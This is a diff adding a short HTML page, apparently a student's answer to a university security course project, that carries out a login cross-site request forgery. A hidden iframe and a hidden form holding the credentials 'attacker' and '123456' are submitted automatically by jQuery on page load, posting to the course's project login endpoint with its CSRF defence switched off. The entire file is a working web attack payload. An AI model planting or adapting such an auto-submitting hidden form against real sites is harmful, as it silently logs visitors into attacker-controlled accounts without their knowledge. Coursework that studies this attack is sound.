@@ -1,0 +1,13 @@
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<html>
+<body>
+<iframe name="csrf0_frame" style="visibility:hidden;"></iframe>
+<form id="csrf0_attack" method="POST" action="http://cs526-s18.cs.purdue.edu/project3/login?csrfdefence=0&xssdefense=4" target="csrf0_frame" style="visibility:hidden;">
+	<input type="text" name="username" value="attacker" />
+	<input type="password" name="password" value="123456" />
+</form>
+<script>
+	$("#csrf0_attack").submit();
+</script>
+</body>
+</html>
